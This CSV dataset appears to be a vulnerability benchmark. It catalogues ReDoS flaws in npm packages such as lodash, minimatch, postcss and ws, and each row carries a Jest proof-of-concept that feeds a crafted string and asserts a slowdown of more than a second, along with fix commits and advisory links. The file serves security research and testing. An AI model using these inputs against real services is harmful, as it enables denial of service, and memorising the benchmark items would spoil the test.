Attack Type,CVE-ID,Package,Version,Fix Version,Exploit File Path,Exploit,Fixed Commit,Sink,Links
redos,,clean-css,4.1.10,4.1.11,redos/clean-css_4.1.10,"test(""ReDoS in clean-css"", () => {
  const measureTime = require(""../utils"").measureTime;
  const CleanCSS = require(""clean-css"");
  let prefix = ""-+.0"";
  let suffix = ""-0"";
  let input;
  let pump = [];
  for (i = 0; i < 10000; i++) {
    pump.push(""0000000000"");
  }
  input =
    "".block{animation:1s test;animation-duration:"" +
    prefix +
    pump.join("""") +
    suffix +
    ""s}"";
  let t = measureTime(function () {
    new CleanCSS({
      level: {
        1: { replaceZeroUnits: false },
        2: true,
      },
    }).minify(input);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/jakubpawlowicz/clean-css/commit/2929bafbf8cdf7dccb24e0949c70833764fa87e3,validator.js:418:20,https://security.snyk.io/vuln/npm:clean-css:20180306; 
redos,,underscore.string,3.3.4,3.3.6,redos/underscore.string_3.3.4,"test(""ReDos in underscore.string"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const us = require(""underscore.string"");
  let t = measureTime(function () {
    var agent = us.unescapeHTML(genstr(50000, ""&""));
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",n/a,unescapeHTML.js:5:26,https://security.snyk.io/vuln/npm:underscore.string:20170908; https://github.com/advisories/GHSA-v2p6-4mp7-3r9v
redos,,minimatch,3.0.0,3.0.2,redos/minimatch_3.0.0,"test(""ReDos in minimatch"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const minimatch = require(""minimatch"");
  let attack_str = ""[!"" + genstr(7000000, ""\\"") + ""A"";
  let t = measureTime(function () {
    minimatch(""foo"", attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/isaacs/minimatch/commit/6944abf9e0694bd22fd9dad293faa40c2bc8a955,minimatch.js:167:14,https://security.snyk.io/vuln/SNYK-JS-MINIMATCH-1019388; https://github.com/advisories/GHSA-hxm2-r34f-qmc5
redos,CVE-2021-23382,postcss,8.0.0,7.0.36,redos/postcss_8.0.0,"function build_attack(n) {
  var ret = ""/*# sourceMappingURL="";
  for (var i = 0; i < n; i++) {
    ret += "" "";
  }
  return ret + ""!"";
}
test(""ReDos in postcss"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const postcss = require(""postcss"");
  let attack_str = build_attack(50000);
  let t = measureTime(function () {
    try {
      postcss.parse(attack_str);
    } catch (e) {}
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/postcss/postcss/commit/2b1d04c867995e55124e0a165b7c6622c1735956,previous-map.js:57:27,https://security.snyk.io/vuln/SNYK-JS-POSTCSS-1255640; https://github.com/advisories/GHSA-566m-qj78-rww5
redos,CVE-2017-16117,slug,0.9.1,0.9.2,redos/slug_0.9.1,"test(""ReDos in slug"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const slug = require(""slug"");
  let t = measureTime(function () {
    slug(""\u2665"" + genstr(50000, "" "") + ""\u2665"");
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/zhuangya/node-slug/commit/e82fccc6b3d850227560db659b17df0e242ae51b,slug.js:64:21,https://security.snyk.io/vuln/npm:slug:20170907; https://github.com/advisories/GHSA-jxqq-cqm6-pfq9
redos,,mobile-detect,1.3.6,1.4.0,redos/mobile-detect_1.3.6,"test(""ReDos in mobile-detect"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const MobileDetect = require(""mobile-detect"");
  let t = measureTime(function () {
    let md = new MobileDetect(genstr(12500, ""Dell""));
    md.phone();
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/hgoebl/mobile-detect.js/commit/7222f6e75cf8cd90e1dc53e445716203eaf79d8a,mobile-detect.js:375:32,https://security.snyk.io/vuln/npm:mobile-detect:20170907; 
redos,CVE-2020-28500,lodash,4.17.4,4.17.21,redos/lodash_4.17.4,"test(""ReDos in lodash"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const _ = require(""lodash"");
  let t = measureTime(function () {
    let agent = _.lowerCase(genstr(50000, ""A""));
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/lodash/lodash/commit/c4847ebe7d14540bb28a8b932a9ce1b9ecbfee1a,lodash.js:1172:29,https://security.snyk.io/vuln/SNYK-JS-LODASH-1018905; https://github.com/advisories/GHSA-29mw-wpgm-hmr9
redos,CVE-2020-26256,fast-csv,4.3.5,4.3.6,redos/fast-csv_4.3.5,"test(""ReDos in fast-csv"", () => {
  const csv = require(""fast-csv"");
  let str1 = "" "".repeat(30000) + ""x\n"";
  let start = process.hrtime();
  const stream = csv
    .parse({
      ignoreEmpty: true,
      delimiter: ""\t"",
    })
    .on(""error"", (error) => {})
    .on(""data"", () => {})
    .on(""end"", () => {
      var t = process.hrtime(start);
      let time = t[0] + t[1] / 1000000000;
      expect(time).toBeGreaterThan(1);
    });
  stream.write(str1);
  stream.end();
});
",https://github.com/C2FO/fast-csv/commit/4bbd39f26a8cd7382151ab4f5fb102234b2f829e,Parser.js:69:64,https://security.snyk.io/vuln/SNYK-JS-FASTCSV-1049538; https://github.com/advisories/GHSA-8cv5-p934-3hwp
redos,CVE-2021-33502,normalize-url,6.0.0,6.0.1,redos/normalize-url_6.0.0,"test(""ReDos in parsejson"", () => {
  const measureTime = require(""../utils"").measureTime;
  const normalizeUrl = require(""normalize-url"");
  let t = measureTime(function () {
    try {
      normalizeUrl(""data:"" + "",#"".repeat(1000) + ""\nx"");
    } catch (e) {}
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/sindresorhus/normalize-url/commit/b1fdb5120b6d27a88400d8800e67ff5a22bd2103,index.js:12:68,https://security.snyk.io/vuln/SNYK-JS-NORMALIZEURL-1296539; https://github.com/advisories/GHSA-px4h-xg32-q955
redos,,dirty-json,0.4.0,0.5.2,redos/dirty-json_0.4.0,"test(""ReDoS in dirty-json"", () => {
  const dJSON = require(""dirty-json"");
  const measureTime = require(""../utils"").measureTime;
  let t = measureTime(function () {
    dJSON.parse(`{ test: ""${""x"".repeat(24)}\\`);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/RyanMarcus/dirty-json/commit/0b9c15e26699538a11e08e0f168af558392dadbe,utils.js:391:28,https://security.snyk.io/vuln/npm:dirty-json:20180213; 
redos,CVE-2021-32640,ws,7.0.0,7.4.6,redos/ws_7.0.0,"test(""ReDos in ws"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const attack_str = ""b"" + "" "".repeat(42000) + ""x"";
  let t = measureTime(function () {
    attack_str.trim().split(/ *, */);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/websockets/ws/commit/00c425ec77993773d823f018f64a5c44e17023ff,jasmineAsyncInstall.js:106:37,https://security.snyk.io/vuln/SNYK-JS-WS-1296835; https://github.com/advisories/GHSA-6fc8-4gx4-v693
redos,CVE-2017-16113,parsejson,0.0.3,n/a,redos/parsejson_0.0.3,"test(""ReDos in parsejson"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const parsejson = require(""parsejson"");
  let t = measureTime(function () {
    parsejson('{""a"":""' + genstr(50000, "" "") + '""}');
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",n/a,index.js:20:38,https://security.snyk.io/vuln/npm:parsejson:20170908; https://github.com/advisories/GHSA-q75g-2496-mxpp
redos,CVE-2021-29060,color-string,1.5.4,1.5.5,redos/color-string_1.5.4,"test(""ReDoS in color-string"", () => {
  const measureTime = require(""../utils"").measureTime;
  const colorString = require(""color-string"");
  let attack_str = ""hwb("" + ""1"".repeat(50000) + ""!"";
  let t = measureTime(function () {
    colorString.get(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/Qix-/color-string/commit/0789e21284c33d89ebc4ab4ca6f759b9375ac9d3,index.js:154:21,https://security.snyk.io/vuln/SNYK-JS-COLORSTRING-1082939; https://github.com/advisories/GHSA-257v-vj4p-3w2h
